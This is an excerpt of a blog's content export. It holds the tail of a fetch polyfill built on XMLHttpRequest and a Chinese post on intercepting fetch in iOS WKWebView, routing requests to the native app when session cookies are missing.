punctuation">(</span><span class="token regex">/\+/g</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span>        <span class="token keyword">var</span> value <span class="token operator">=</span> split<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\+/g</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span>        form<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> form<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">parseHeaders</span><span class="token punctuation">(</span>rawHeaders<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Headers</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// Replace instances of \r\n and \n followed by at least one space or horizontal tab with a space</span>  <span class="token comment" spellcheck="true">// https://tools.ietf.org/html/rfc7230#section-3.2</span>  <span class="token keyword">var</span> preProcessedHeaders <span class="token operator">=</span> rawHeaders<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\r?\n[\t ]+/g</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span>  preProcessedHeaders<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token regex">/\r?\n/</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> parts <span class="token operator">=</span> line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    <span class="token keyword">var</span> key <span class="token operator">=</span> parts<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> value <span class="token operator">=</span> parts<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      headers<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> headers<span class="token punctuation">}</span>Body<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Request<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">Response</span><span class="token punctuation">(</span>bodyInit<span class="token punctuation">,</span> options<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>    options <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'default'</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">=</span> options<span class="token punctuation">.</span>status <span class="token operator">===</span> undefined <span class="token operator">?</span> <span class="token number">200</span> <span class="token punctuation">:</span> options<span class="token punctuation">.</span>status  <span class="token keyword">this</span><span class="token punctuation">.</span>ok <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">>=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">&lt;</span> <span class="token number">300</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>statusText <span class="token operator">=</span> <span class="token string">'statusText'</span> <span class="token keyword">in</span> options <span class="token operator">?</span> options<span class="token punctuation">.</span>statusText <span class="token punctuation">:</span> <span class="token string">'OK'</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Headers</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>url <span class="token operator">=</span> options<span class="token punctuation">.</span>url <span class="token operator">||</span> <span class="token string">''</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_initBody</span><span class="token punctuation">(</span>bodyInit<span class="token punctuation">)</span><span class="token punctuation">}</span>Body<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Response<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>Response<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>clone <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyInit<span class="token punctuation">,</span> <span class="token punctuation">{</span>    status<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status<span class="token punctuation">,</span>    statusText<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>statusText<span class="token punctuation">,</span>    headers<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Headers</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">,</span>    url<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>url  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>Response<span class="token punctuation">.</span>error <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> response <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>status<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> statusText<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  response<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'error'</span>  <span class="token keyword">return</span> response<span class="token punctuation">}</span><span class="token keyword">var</span> redirectStatuses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">301</span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">,</span> <span class="token number">307</span><span class="token punctuation">,</span> <span class="token number">308</span><span class="token punctuation">]</span>Response<span class="token punctuation">.</span>redirect <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> status<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>redirectStatuses<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RangeError</span><span class="token punctuation">(</span><span class="token string">'Invalid status code'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>status<span class="token punctuation">:</span> status<span class="token punctuation">,</span> headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>location<span class="token punctuation">:</span> url<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">var</span> DOMException <span class="token operator">=</span> self<span class="token punctuation">.</span>DOMException<span class="token keyword">try</span> <span class="token punctuation">{</span>  <span class="token keyword">new</span> <span class="token class-name">DOMException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  DOMException <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name    <span class="token keyword">var</span> error <span class="token operator">=</span> <span class="token function">Error</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>stack <span class="token operator">=</span> error<span class="token punctuation">.</span>stack  <span class="token punctuation">}</span>  DOMException<span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>Error<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>  DOMException<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> DOMException<span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">fetch</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> init<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> init<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>signal <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>signal<span class="token punctuation">.</span>aborted<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DOMException</span><span class="token punctuation">(</span><span class="token string">'Aborted'</span><span class="token punctuation">,</span> <span class="token string">'AbortError'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">function</span> <span class="token function">abortXhr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      xhr<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    xhr<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>        status<span class="token punctuation">:</span> xhr<span class="token punctuation">.</span>status<span class="token punctuation">,</span>        statusText<span class="token punctuation">:</span> xhr<span class="token punctuation">.</span>statusText<span class="token punctuation">,</span>        headers<span class="token punctuation">:</span> <span class="token function">parseHeaders</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span><span class="token function">getAllResponseHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      options<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string">'responseURL'</span> <span class="token keyword">in</span> xhr <span class="token operator">?</span> xhr<span class="token punctuation">.</span>responseURL <span class="token punctuation">:</span> options<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'X-Request-URL'</span><span class="token punctuation">)</span>      <span class="token keyword">var</span> body <span class="token operator">=</span> <span class="token string">'response'</span> <span class="token keyword">in</span> xhr <span class="token operator">?</span> xhr<span class="token punctuation">.</span>response <span class="token punctuation">:</span> xhr<span class="token punctuation">.</span>responseText      <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    xhr<span class="token punctuation">.</span>onerror <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">'Network request failed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    xhr<span class="token punctuation">.</span>ontimeout <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">'Network request failed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    xhr<span class="token punctuation">.</span>onabort <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DOMException</span><span class="token punctuation">(</span><span class="token string">'Aborted'</span><span class="token punctuation">,</span> <span class="token string">'AbortError'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>method<span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>credentials <span class="token operator">===</span> <span class="token string">'include'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>credentials <span class="token operator">===</span> <span class="token string">'omit'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'responseType'</span> <span class="token keyword">in</span> xhr <span class="token operator">&amp;&amp;</span> support<span class="token punctuation">.</span>blob<span class="token punctuation">)</span> <span class="token punctuation">{</span>      xhr<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'blob'</span>    <span class="token punctuation">}</span>    request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>      xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>signal<span class="token punctuation">)</span> <span class="token punctuation">{</span>      request<span class="token punctuation">.</span>signal<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'abort'</span><span class="token punctuation">,</span> abortXhr<span class="token punctuation">)</span>      xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// DONE (success or failure)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          request<span class="token punctuation">.</span>signal<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">'abort'</span><span class="token punctuation">,</span> abortXhr<span class="token punctuation">)</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> request<span class="token punctuation">.</span>_bodyInit <span class="token operator">===</span> <span class="token string">'undefined'</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token punctuation">:</span> request<span class="token punctuation">.</span>_bodyInit<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>fetch<span class="token punctuation">.</span>polyfill <span class="token operator">=</span> <span class="token boolean">true</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>self<span class="token punctuation">.</span>fetch<span class="token punctuation">)</span> <span class="token punctuation">{</span>  self<span class="token punctuation">.</span>fetch <span class="token operator">=</span> fetch  self<span class="token punctuation">.</span>Headers <span class="token operator">=</span> Headers  self<span class="token punctuation">.</span>Request <span class="token operator">=</span> Request  self<span class="token punctuation">.</span>Response <span class="token operator">=</span> Response<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> fetch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> fetch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fetch拦截代理</title>
      <link href="2018/12/22/fetchhook/"/>
      <url>2018/12/22/fetchhook/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>传统 Ajax 指的是 XMLHttpRequest（XHR），后续逐渐会被 <a href="https://fetch.spec.whatwg.org/" target="_blank" rel="noopener">Fetch</a> 替代。</p><p>对于 IE8+ 以上浏览器，在生产环境使用 Fetch 是可行的；</p><p>由于 Fetch API 是基于 Promise 设计，有必要先学习一下 Promise，推荐阅读 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise" target="_blank" rel="noopener">MDN Promise 教程</a>。旧浏览器不支持 Promise，需要使用 polyfill <a href="https://github.com/jakearchibald/es6-promise" target="_blank" rel="noopener">es6-promise</a> 。</p><p>XMLHttpRequest 是一个设计粗糙的 API，不符合关注分离（Separation of Concerns）的原则，配置和调用方式非常混乱，而且基于事件的异步模型写起来也没有现代的 Promise，generator/yield，async/await 友好。</p><h2 id="iOS-fetch"><a href="#iOS-fetch" class="headerlink" title="iOS fetch"></a>iOS fetch</h2><p>业内目前有不少APP在iOS端使用WKwebview；</p><p>WKWebView会忽视默认的网络存储， NSURLCache, NSHTTPCookieStorage, NSCredentialStorage。 目前是这样的，WKWebView有自己的进程，同样也有自己的存储空间用来存储cookie和cache， 其他的网络类如NSURLConnection是无法访问到的。 同时WKWebView发起的资源请求也是不经过NSURLProtocol的，导致无法自定义请求。</p><blockquote><p> WKWebView 请求携带的 Cookie 的 Secure 属性不齐全在后面拼接完整 Cookie 的 Secure 属性 cookie、 path、domain</p></blockquote><p> <a href="https://developer.mozilla.org/en-US/docs/Web/API/document/cookie" target="_blank" rel="noopener">Document.cookie - Web APIs | MDN</a></p><p>请求时携带的Cookie丢失或Cookie不相同，这就导致服务端请求异常，这时就需要针对APP做一个统一处理。</p><h2 id="fetch拦截处理"><a href="#fetch拦截处理" class="headerlink" title="fetch拦截处理"></a>fetch拦截处理</h2><p>前端拦截所有fetch请求，统一处理</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//拦截原始的fetch方法</span><span class="token keyword">var</span> oldFetchfn <span class="token operator">=</span> fetch<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//iOS WKwebview判断</span><span class="token keyword">if</span><span class="token punctuation">(</span>oldFetchfn <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span>webkit <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span>webkit<span class="token punctuation">.</span>messageHandlers<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> current <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    current <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token punctuation">(</span>current <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> messageId <span class="token operator">=</span> current<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> globalId <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//定义新的fetch方法，封装原有的fetch方法</span>    <span class="token comment" spellcheck="true">//可定义成widow方法全局覆盖 也可export输出新的fetch模块这是就需要业务方使用新的fetch请求</span>    window<span class="token punctuation">.</span>fetch <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//处理多个并发请求 每个请求回调赋值id</span>        globalId <span class="token operator">=</span> messageId<span class="token punctuation">;</span>        messageId<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> message <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        message<span class="token punctuation">.</span>id <span class="token operator">=</span> globalId<span class="token punctuation">;</span>        message<span class="token punctuation">.</span>data <span class="token operator">=</span> opts<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        message<span class="token punctuation">.</span>method <span class="token operator">=</span> opts<span class="token punctuation">.</span>method<span class="token punctuation">;</span>        message<span class="token punctuation">.</span>url <span class="token operator">=</span> input<span class="token punctuation">;</span>        message<span class="token punctuation">.</span>headers <span class="token operator">=</span> opts<span class="token punctuation">.</span>headers<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//判断iOS端cookie是否丢失 判断依据根据自己业务使用的关键cookie判断，</span>        <span class="token comment" spellcheck="true">//下面的判断是我本人业务开发时的关键cookie</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'PPU='</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span>         <span class="token operator">||</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'sign='</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span>        <span class="token operator">||</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'source='</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//此处是根据自己APP业务处理的 仅供参考</span>                <span class="token keyword">var</span> callback <span class="token operator">=</span> <span class="token string">"fetch_callback"</span> <span class="token operator">+</span> globalId                window<span class="token punctuation">[</span>callback<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> native<span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">//native端完成网络请求返回response结果 resolve给业务调用方</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>globalId <span class="token operator">=</span> id <span class="token operator">&amp;&amp;</span> native<span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">resolve</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>native<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token 